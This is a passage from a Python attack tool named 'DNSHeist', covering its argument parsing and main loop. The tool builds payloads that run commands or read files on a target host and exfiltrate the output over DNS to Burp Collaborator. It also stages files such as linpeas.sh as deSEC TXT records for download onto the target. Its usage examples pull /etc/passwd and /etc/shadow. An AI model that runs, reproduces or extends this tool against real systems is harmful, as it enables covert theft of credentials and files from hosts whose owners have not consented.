        description="DNSHeist — exfiltrate command output or files via Burp Collaborator DNS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s --from-burp                                      # interactive mode
  %(prog)s --from-burp --cmd "cat /etc/passwd"              # exfil command output
  %(prog)s --from-burp --file "/etc/shadow" --platform 2    # exfil file (binary-safe)
  %(prog)s --desec-stage linpeas.sh --desec-domain x.dedyn.io --desec-token TOK
  %(prog)s --desec-clean --desec-domain x.dedyn.io --desec-token TOK"""
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument(
        "--from-burp", action="store_true",
        help="Receive exfiltrated data via Burp Collaborator"
    )
    mode.add_argument(
        "--desec-stage", metavar="FILE", default=None,
        help="Stage a file as TXT records on deSEC DNS for client upload"
    )
    mode.add_argument(
        "--desec-clean", action="store_true",
        help="Remove all staged TXT records from deSEC domain"
    )
    parser.add_argument(
        "--desec-domain", default=None,
        help="deSEC domain name (e.g. x.dedyn.io)"
    )
    parser.add_argument(
        "--desec-token", default=None,
        help="deSEC API token"
    )
    parser.add_argument(
        "--desec-dest", default=None, metavar="PATH",
        help="Download destination path on target (for --desec-stage, default: /tmp/<filename>)"
    )
    parser.add_argument(
        "--cmd", default=None,
        help="Command to execute on target (skips interactive prompt)"
    )
    parser.add_argument(
        "--file", default=None, metavar="PATH",
        help="File path on target to exfiltrate (binary-safe, skips interactive prompt)"
    )
    parser.add_argument(
        "--platform", default=None, choices=["1", "2", "3", "4", "5", "all"],
        help="Platform for payload: 1=PowerShell, 2=bash+nslookup, 3=bash+ping, 4=sh+nslookup, 5=sh+ping, all=show all"
    )
    parser.add_argument(
        "--output", "-o", default=None,
        help="Save received files/output to this path or directory"
    )

    args = parser.parse_args()

    # Handle deSEC modes (they exit after completion)
    if args.desec_stage or args.desec_clean:
        if not args.desec_domain or not args.desec_token:
            parser.error("--desec-domain and --desec-token are required for deSEC modes")
        if args.desec_stage:
            desec_stage(args.desec_stage, args.desec_domain, args.desec_token, dest=args.desec_dest)
        elif args.desec_clean:
            desec_clean(args.desec_domain, args.desec_token)
        sys.exit(0)

    # ── --from-burp mode ──
    print("=" * 60)
    print("  DNSHeist")
    print("=" * 60)

    print(f"[*] Polling Burp helper at {BURP_API}")

    try:
        resp = urlopen(Request(f"{BURP_API}/collaborator"), timeout=3)
        info = json.loads(resp.read().decode("utf-8"))
        print(f"[*] Connected")
        collab_domain = info.get("payload", "?")
        print(f"[*] Collaborator domain: {collab_domain}")
    except Exception:
        print(f"[!] Cannot reach Burp helper at {BURP_API}")
        print("[!] Make sure collab_helper.py is loaded in Burp Suite")
        sys.exit(1)

    # Generate payload(s)
    if args.cmd and args.file:
        parser.error("--cmd and --file are mutually exclusive")
    elif args.cmd:
        if args.platform == "all" or args.platform is None:
            _display_all(CMD_GENERATORS, args.cmd, "Command", collab_domain)
        else:
            _display_single(CMD_GENERATORS, args.cmd, args.platform, collab_domain)
    elif args.file:
        if args.platform == "all" or args.platform is None:
            _display_all(FILE_GENERATORS, args.file, "File", collab_domain)
        else:
            _display_single(FILE_GENERATORS, args.file, args.platform, collab_domain)
    else:
        interactive_payload(collab_domain)

    # Start receiving
    recv_chunks = {}
    recv_lock = threading.Lock()

    print(f"\n[*] Waiting for DNS interactions...\n")

    try:
        burp_receive_loop(recv_chunks, recv_lock)
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")

    # Output received data
    print(f"\n[+] Received {len(recv_chunks)} chunks")
    if recv_chunks:
        reassemble_and_output(recv_chunks, args.output)


if __name__ == "__main__":
    main()